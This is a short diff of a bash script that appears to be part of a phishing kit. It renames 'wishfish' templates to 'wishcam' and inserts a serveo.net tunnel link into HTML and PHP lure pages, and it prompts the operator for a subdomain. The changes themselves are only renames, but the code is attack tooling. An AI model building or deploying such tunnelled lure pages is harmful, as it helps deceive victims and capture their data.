@@ -195,7 +195,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' wishfish.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' wishcam.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -204,7 +204,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="wishfish$RANDOM"
+default_subdomain="wishcam$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
